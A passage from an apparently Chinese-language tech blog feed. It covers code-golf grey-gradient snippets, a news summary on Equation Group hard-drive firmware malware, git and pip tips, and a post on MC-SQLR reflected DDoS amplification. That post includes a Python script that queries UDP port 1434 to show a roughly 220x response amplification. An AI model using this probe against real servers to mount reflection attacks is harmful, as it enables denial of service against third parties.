class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setColor&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Color&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;328965&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;)),&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;fillRect&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++/&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="n"&gt;setSize&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;600&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;600&lt;/span&gt;&lt;span class="o"&gt;);}}.&lt;/span&gt;&lt;span class="na"&gt;show&lt;/span&gt;&lt;span class="o"&gt;();}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;R - 35 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;symbols&lt;span class="p"&gt;(&lt;/span&gt;x&lt;span class="p"&gt;,,,&lt;/span&gt;x&lt;span class="o"&gt;&amp;lt;-&lt;/span&gt;&lt;span class="m"&gt;50&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="m"&gt;99&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;bg&lt;span class="o"&gt;=&lt;/span&gt;gray&lt;span class="p"&gt;(&lt;/span&gt;x&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;99&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;ipython 2 - 54 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;t=arange(50);c=t/50.;scatter(t%5,t,500,zip(c,c,c),&amp;#39;s&amp;#39;)  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;ipython 2 - 61 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;imshow(arange(50).reshape(5,10)*.02,&amp;#39;Greys&amp;#39;,None,1,&amp;#39;nearest&amp;#39;)  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;BBC BASIC - 57 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="vg"&gt;FORn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="il"&gt;51&lt;/span&gt;&lt;span class="vg"&gt;TO2STEP&lt;/span&gt;&lt;span class="il"&gt;-1&lt;/span&gt;&lt;span class="vg"&gt;VDU19&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="il"&gt;-1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="vg"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="vg"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nl"&gt;n:&lt;/span&gt;&lt;span class="vg"&gt;RECTANGLEFILL0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="il"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="vg"&gt;n&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="il"&gt;20&lt;/span&gt;&lt;span class="vg"&gt;NEXT&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;C++ - 93 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;cstdio&amp;gt;  &lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="p"&gt;;)&lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;\e[48;2;%i;%i;%im &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;);}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;C - 58 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="p"&gt;;)&lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;\e[48;2;%i;%i;%im &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;);}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;JavaScript - 72 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="p"&gt;;)&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;font color=#&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;--+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; size=7&amp;gt;&amp;amp;#9632;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;JavaScript - 70 chars  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;;)&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;font color=&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; size=7&amp;gt;&amp;amp;#9632;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一大堆... 剩下懶得看了XDD&lt;br /&gt;
好多沒看過的語言啊...&lt;br /&gt;
是說原來這種比誰寫的 code 短的比賽方式叫 Code Golf 呀  &lt;/p&gt;</summary><category term="Fifty Shades of Grey"></category><category term="joke"></category><category term="geek"></category><category term="Code Golf"></category></entry><entry><title>Malware Deep Within Hard Drive Firmware</title><link href="https://blog.m157q.tw/posts/2015/02/18/malware-deep-within-hard-drive-firmware/" rel="alternate"></link><published>2015-02-18T21:21:29+08:00</published><updated>2015-02-18T21:21:29+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-18:posts/2015/02/18/malware-deep-within-hard-drive-firmware/</id><summary type="html">&lt;h1&gt;Intro&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The team of malicious actors is dubbed the the "Equation Group" by researchers from Moscow-based Kaspersky Lab, and describes them as "probably one of the most sophisticated cyber attack groups in the world," and "the most advanced threat actor we have seen."  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這個被稱作是 Equation Group 的駭客組織，&lt;br /&gt;
被卡巴斯基位於莫斯科的研究人員認為&lt;br /&gt;
可能是目前使用最複雜的網路攻擊手法且最具威脅性的駭客組織之一。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Russian security experts reportedly uncovered state-created spyware hidden in the hard drive firmware of more than dozen of the largest manufacturers brands in the industry, including Samsung, Western Digital, Seagate, Maxtor, Toshiba and Hitachi.&lt;br /&gt;
These infected hard drives would have given the cyber criminals persistence on victims' computers and allowed them to set up secret data stores on the machines, which is only accessible to the malicious hackers.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;許多硬碟大廠生產的硬碟都中標了，&lt;br /&gt;
包括 Samsung, WD, Seagate, Maxtor, Toshiba, Hitachi。&lt;br /&gt;
這些受到感染的硬碟將會允許駭客植入隱藏的且只有駭客能存取的資料。&lt;br /&gt;
(這不是幾乎所有硬碟都別用了嗎...?)  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;One of the most sophisticated features of these notorious piece of hacking tools is the ability to infect not just the files stored on a hard drive, but also the firmware controlling the hard drive itself. The malware is hidden deep within hard drives in such a way that it is difficult to detect or remove it.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不僅可以感染硬碟上的檔案，更嚴重的是可以感染控制硬碟的韌體，導致非常難偵測和移除。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If present, once the victim insert that infected storage (such as a CD or USB drive) into an internet-connected PC, the malicious code allows hackers to snoop victims' data and map their networks that would otherwise be inaccessible.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;被感染的 CD 或 USB 插入連網的電腦的話，&lt;br /&gt;
將會導致駭客可以窺探受害者的資料並對應出使用者在網路上的位置。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Such an exploit could survive a complete hard drive wipe, or the re-installation of an operating system, and "exceeds anything we have ever seen before,"  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;格式化硬碟或重灌作業系統都無法清除此惡意程式，&lt;br /&gt;
超越了至今為止我們所見過的惡意程式。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The firm recovered two modules belonging to Equation group, dubbed EquationDrug and GrayFish. Both were used to reprogram hard drives to give the malicious hackers ability to persistently control over a target machine.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此惡意程式包含了 EquationDrug 和 GrayFish 兩個模組，&lt;br /&gt;
兩者皆是用來對硬碟進行重新程式化，&lt;br /&gt;
駭客藉此得以對受害者的電腦進行持續性的控制。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GrayFish can install itself into computer's boot record — a software code that loads before the operating system itself — and stores all of its data inside a portion of the operating system known as the registry, where configuration data is normally stored.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;GrayFish 可以將自身安裝進電腦的 Boot Record 中，&lt;br /&gt;
並將自身的資料儲存在作業系統的 Registry 中。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;EquationDrug, on the other hand, was designed to be used on older versions of Windows operating systems, and "some of the plugins were designed originally for use on Windows 95/98/ME" — very old versions of Windows OS that they offer a good indication of the Equation Group's age.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;EquationDrug 則是被設計來用於早期的 Windows 作業系統中，&lt;br /&gt;
裡頭一些套件甚至是被設計用於 Windows 95/98/Me 上，&lt;br /&gt;
這也顯示了 Equation Group 這個組織存在了一段不短的時間了。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Security researchers are calling the malware as the "ancestor" of Stuxnet and Flame, the most sophisticated and powerful threats that were specially designed to spy and sabotage ICS and SCADA systems.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;資安研究者將此惡意程式視為 Stuxnet 和 Flame 這兩個惡意程式的原型。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Kaspersky declined to publicly name the country or agency behind the spying campaign, but said it was closely linked to Stuxnet — the NSA-led cyberweapon that was used to sabotage the Iran's uranium enrichment facility.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;卡巴斯基並未言明 Equation Group 幕後的支持者是誰，&lt;br /&gt;
但表示和 Stuxnet (NSA 用來攻擊伊朗核電廠的工具) 有密切關聯。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Another reason is that most of the infections discovered by the Moscow-based security firm have occurred in countries that are frequently US spying targets, such as China, Iran, Pakistan and Russia.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;另外一個懷疑的原因則是，&lt;br /&gt;
受害事件發生的國家幾乎都是美國監視的國家，&lt;br /&gt;
如：中國、伊朗、巴基斯坦、俄羅斯。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For its part, the NSA declined to comment on the report.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;NSA 目前拒絕對此做出任何回應。  &lt;/p&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://thehackernews.com/2015/02/hard-drive-firmware-hacking.html"&gt;NSA Planted Stuxnet-Type Malware Deep Within Hard Drive Firmware - Hacker News&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/news/94142"&gt;Kaspersky發現歷來最高明的駭客團體 疑與NSA有關聯 | iThome&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.geek.com/apps/nsa-malware-found-hiding-in-hard-drives-for-almost-20-years-1615949/"&gt;NSA malware found hiding in hard drives for almost 20 years | Apps and Software | Geek.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="NSA"></category><category term="malware"></category><category term="Security"></category></entry><entry><title>Check files tracked by git</title><link href="https://blog.m157q.tw/posts/2015/02/18/check-files-tracked-by-git/" rel="alternate"></link><published>2015-02-18T11:39:37+08:00</published><updated>2015-02-18T11:39:37+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-18:posts/2015/02/18/check-files-tracked-by-git/</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git ls-files  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;or  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git ls-tree -r &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;branch&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; --name-only  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/15606955/how-can-i-make-git-show-a-list-of-the-files-that-are-being-tracked"&gt;How can I make git show a list of the files that are being tracked? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="Git"></category></entry><entry><title>pip install lxml fail in Mac</title><link href="https://blog.m157q.tw/posts/2015/02/04/pip-install-lxml-fail-in-mac/" rel="alternate"></link><published>2015-02-11T04:25:05+08:00</published><updated>2015-02-11T04:25:05+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-04:posts/2015/02/04/pip-install-lxml-fail-in-mac/</id><summary type="html">&lt;p&gt;While I built up the develope environment for &lt;code&gt;Pelican&lt;/code&gt; on my Mac OSX 10.9,&lt;br /&gt;
I encounterd this problem below:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="n"&gt;included&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lxml&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lxml&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;etree&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nl"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;239&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  

    &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;private&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;folders&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;td9_yf3x7lv6myk_9cy1_h640000gn&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;pip&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;build&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;UkRKm0&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lxml&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lxml&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;includes&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;  
&lt;span class="n"&gt;tree_defs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nl"&gt;h&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fatal&lt;/span&gt; &lt;span class="nl"&gt;error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;libxml&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;xmlversion&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;  

    &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="n"&gt;include&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;libxml/xmlversion.h&amp;quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Solution&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ brew install libxml2  
$ brew link libxml2 --force  
$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;C_INCLUDE_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/Cellar/libxml2/2.9.2/include/libxml2:&lt;span class="nv"&gt;$C_INCLUDE_PATH&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Reference&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/17857858/fail-to-install-lxml-in-macos-10-8-4"&gt;python - Fail to install lxml in MacOS 10.8.4 - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="pip"></category><category term="lxml"></category><category term="Mac"></category><category term="Pelican"></category></entry><entry><title>MC-SQLR 放大攻擊</title><link href="https://blog.m157q.tw/posts/2015/01/22/mc-sqlr-amplification-attack/" rel="alternate"></link><published>2015-10-27T11:44:00+08:00</published><updated>2015-10-27T11:44:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-01-22:posts/2015/01/22/mc-sqlr-amplification-attack/</id><summary type="html">&lt;p&gt;在 Twitter 上看到  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://twitter.com/hdmoore/status/558041881138192386"&gt;HD Moore on Twitter: "MS SQL Server Resolution Service enables reflected DDoS with 440x amplification http://t.co/wAy3szhseR &amp;lt; Still 200k+ vulnerable IPs on IPv4"&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;原文連結&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://kurtaubuchon.blogspot.tw/2015/01/mc-sqlr-amplification-ms-sql-server.html"&gt;Default Deny: MC-SQLR Amplification: MS SQL Server Resolution Service enables reflected DDoS with 440x amplification&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;大致上是說在 2014 聖誕夜&lt;br /&gt;
有個據信由 Bitcoin Baron 發起的&lt;br /&gt;
針對 the City of Columbia, Missouri 的網站&lt;br /&gt;
進行的 DDoS 攻擊中&lt;br /&gt;
發現大量的 &lt;code&gt;1434/UDP&lt;/code&gt; 封包&lt;br /&gt;
此類封包的平均大小大約為 441 bytes (含 header)&lt;br /&gt;
封包內容長得像這樣  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ServerName;WIN3H1QPRPTOAS;InstanceName;MSSQLSERVER;  
IsClustered;No;Version;9.00.5000.00;tcp;1433;np;  
\\WIN3H1QPRPTOAS\pipe\sql\query;;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;經由作者追查後發現&lt;br /&gt;
是 MS SQL Server Resolution Service 所使用的&lt;br /&gt;
稱為 MC-SQLR 的 Protocol&lt;br /&gt;
存在於 MS SQL Server 2000 及其以後的版本中&lt;br /&gt;
client 只要送 1 bytes 的 data 就會讓 Server 回傳此封包&lt;br /&gt;
範例的 python3 sciprt 蠻簡單的  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;  

&lt;span class="n"&gt;HOST_IP&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.1.1&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;HOST_IP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1434&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="n"&gt;qry&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromhex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;02&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;qry&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5120&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;將封包扣除 header 的大小後&lt;br /&gt;
大約是 220 bytes 左右&lt;br /&gt;
所以放大了 220 倍左右&lt;br /&gt;
